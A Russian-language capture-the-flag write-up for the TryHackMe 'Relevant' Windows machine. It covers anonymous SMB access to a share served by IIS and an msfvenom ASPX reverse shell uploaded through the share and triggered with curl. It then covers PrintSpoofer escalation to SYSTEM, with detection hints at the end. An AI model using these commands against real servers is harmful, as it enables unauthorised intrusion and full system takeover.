# Relevant: SMB-шара, которая оказалась веб-рутом

**Машина:** [Relevant](https://tryhackme.com/room/relevant) (medium, Windows)
**Путь:** nmap → anonymous SMB → passwords.txt (тупик) → gobuster → шара = веб-рут → aspx-шелл → PrintSpoofer

## Разведка

nmap показывает классический набор: 80, 135, 139, 445, 3389 и ещё один HTTP-сервис на 49663. Обе веб-страницы — дефолтный IIS. Энумерация SMB:

```bash
smbclient -L //TARGET -N
smbclient //TARGET/nt4wrksv -N
```

В шаре `nt4wrksv` лежит `passwords.txt` с учётными данными двух пользователей в base64. Декодировал — а дальше некуда: RDP не пускает, ничего с ними не делается. Тупик.

## Поворот

gobuster по второму порту (49663) находит `/nt4wrksv` — то же имя, что у шары. Открываю в браузере — вижу `passwords.txt` из шары. Каталог шары опубликован через IIS. Загруженный по SMB ASPX-файл можно вызвать по HTTP, если для него настроен соответствующий обработчик.

## Футхолд

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o rev.aspx
smbclient //TARGET/nt4wrksv -N
smb: \> put rev.aspx
curl http://TARGET:49663/nt4wrksv/rev.aspx
```

Ловлю шелл как `iis apppool\defaultapppool`, user.txt с десктопа Bob.

## Привилегии

`whoami /priv` — `SeImpersonatePrivilege` включён. Классика:

```
PrintSpoofer.exe -i -c cmd
whoami → nt authority\system
```

Кидаю PrintSpoofer через ту же шару, запускаю из `c:\inetpub\wwwroot\nt4wrksv`, root.txt с десктопа администратора.

## Как обнаружить

При включённом аудите событие 5145 показывает проверку доступа к файлу через шару; само по себе оно ещё не подтверждает запись. Его стоит сопоставить с созданием `.aspx` и запросом к этому файлу в IIS. В 4688 можно искать запуск `cmd.exe` из `w3wp.exe`: это признак выполнения команды веб-приложением, но не доказательство повышения привилегий. Для PrintSpoofer отдельно проверяем запуск инструмента и контекст SYSTEM у созданного процесса.

## Заметка

nmap-скрипты кричали про CVE-2017-0143 (EternalBlue) на 445 — и я поначалу полез туда, просидел с ним вдоволь. Ложный след: машина не бралась через MS17-010, а бралась через «скучную» ошибку конфигурации. Здесь рабочий путь нашёлся при сопоставлении SMB-шары и каталога на втором HTTP-сервисе.
